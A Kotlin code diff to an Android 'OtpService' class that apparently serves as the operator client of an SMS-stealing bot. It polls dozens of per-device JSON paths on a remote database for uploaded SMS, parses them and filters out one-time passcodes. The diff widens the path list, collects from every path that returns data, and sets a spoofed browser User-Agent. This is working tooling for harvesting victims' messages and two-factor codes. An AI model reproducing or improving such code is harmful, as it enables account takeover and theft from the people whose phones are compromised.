@@ -1,5 +1,6 @@
 package com.sanji.bomberpro.services
 
+import android.util.Log
 import com.sanji.bomberpro.data.OtpMessage
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
@@ -21,8 +22,8 @@ class OtpService {
     private val seenHashes = ConcurrentHashMap<String, MutableSet<String>>()
 
     private val MAX_MESSAGES = 300
-    private val PATH_TIMEOUT_MS = 4000L
 
+    // extended path list — bot's 14 + extras for non-standard device payloads
     private fun msgPaths(devId: String): List<String> = listOf(
         "/clients/$devId/messages.json",
         "/clients/$devId/sms.json",
@@ -38,6 +39,19 @@ class OtpService {
         "/devices/$devId/messages.json",
         "/devices/$devId/sms.json",
         "/received/$devId.json",
+        // extras
+        "/clients/$devId/messageList.json",
+        "/clients/$devId/latestMessages.json",
+        "/clients/$devId/allMessages.json",
+        "/clients/$devId/inboxMessages.json",
+        "/clients/$devId/receivedMessages.json",
+        "/clients/$devId/webhookEvent/lastSms.json",
+        "/clients/$devId/otp.json",
+        "/clients/$devId/otpList.json",
+        "/clients/$devId/smsData.json",
+        "/clients/$devId/msgList.json",
+        "/clients/$devId/data/messages.json",
+        "/clients/$devId/smsCollection.json",
     )
 
     suspend fun readMessages(device: Device): List<OtpMessage> = withContext(Dispatchers.IO) {
@@ -52,20 +66,33 @@ class OtpService {
         } else allPaths
 
         val dedupe = HashMap<String, OtpMessage>()
+        var workingPath: String? = null
 
         for (path in orderedPaths) {
             val url = fbUrl + path
-            val data = fetchJson(url) ?: continue
+            val data = fetchJson(url)
+            if (data == null) continue
+
             val items = parseItems(data)
+            if (items.isEmpty()) continue
+
+            Log.d(TAG, "readMessages ${device.shortId}: ${items.size} items at $path")
+
             for ((msgId, payload) in items) {
                 val parsed = parseMessage(msgId, payload) ?: continue
                 if (parsed.hash in dedupe) continue
                 dedupe[parsed.hash] = parsed
             }
-            if (items.isNotEmpty()) {
-                pathCache[cacheKey] = path
-                break
+            if (items.isNotEmpty() && workingPath == null) {
+                workingPath = path
             }
+            // don't break — gather from all paths that yield data
+        }
+
+        workingPath?.let { pathCache[cacheKey] = it }
+
+        if (dedupe.isEmpty()) {
+            Log.w(TAG, "readMessages ${device.shortId}: 0 messages across ${allPaths.size} paths")
         }
 
         dedupe.values.sortedByDescending { it.ts }
@@ -82,13 +109,11 @@ class OtpService {
     }
 
     suspend fun collectAllOtp(device: Device): List<OtpMessage> {
-        val all = collectAll(device)
-        return all.filter { it.hasOtp }
+        return collectAll(device).filter { it.hasOtp }
     }
 
     suspend fun collectSince(device: Device, sinceTs: Long): List<OtpMessage> {
-        val all = collectAll(device)
-        return all.filter { it.hasOtp && it.ts >= sinceTs }
+        return collectAll(device).filter { it.hasOtp && it.ts >= sinceTs }
     }
 
     fun markSeen(devId: String, hash: String) {
@@ -110,7 +135,12 @@ class OtpService {
 
     private fun fetchJson(url: String): Any? {
         return try {
-            val req = Request.Builder().url(url).get().build()
+            val req = Request.Builder()
+                .url(url)
+                .header("Accept", "application/json")
+                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
+                .get()
+                .build()
             http.newCall(req).execute().use { resp ->
                 if (!resp.isSuccessful) return null
                 val body = resp.body?.string() ?: return null
@@ -119,13 +149,9 @@ class OtpService {
                 try {
                     if (trimmed.startsWith("[")) JSONArray(trimmed)
                     else JSONObject(trimmed)
-                } catch (_: Exception) {
-                    null
-                }
+                } catch (_: Exception) { null }
             }
-        } catch (_: Exception) {
-            null
-        }
+        } catch (_: Exception) { null }
     }
 
     private fun parseItems(data: Any?): List<Pair<String, JSONObject>> {
@@ -139,14 +165,21 @@ class OtpService {
                 val looksLikeMsg = lower.any {
                     it == "body" || it == "message" || it == "text" ||
                             it == "msg" || it == "content" || it == "address" ||
-                            it == "sender"
+                            it == "sender" || it == "from"
                 }
                 if (looksLikeMsg) {
                     out.add("${System.currentTimeMillis()}" to data)
                 } else {
                     for (k in keyList) {
                         val v = data.opt(k)
-                        if (v is JSONObject) out.add(k to v)
+                        if (v is JSONObject) {
+                            out.add(k to v)
+                        } else if (v is JSONArray) {
+                            for (i in 0 until v.length()) {
+                                val vi = v.opt(i)
+                                if (vi is JSONObject) out.add("$k-$i" to vi)
+                            }
+                        }
                     }
                 }
             }
@@ -179,7 +212,6 @@ class OtpService {
         )?.toString()?.toLongOrNull() ?: 0L
 
         if (ts > 10_000_000_000L) ts /= 1000L
-
         val now = System.currentTimeMillis() / 1000L
         if (ts > now + 3600) ts = now
         if (ts < 1_420_000_000L) ts = 0L
@@ -225,5 +257,9 @@ class OtpService {
         cal.set(java.util.Calendar.SECOND, 0)
         cal.set(java.util.Calendar.MILLISECOND, 0)
         return cal.timeInMillis / 1000L
+    }
+
+    companion object {
+        private const val TAG = "OtpService"
     }
 }
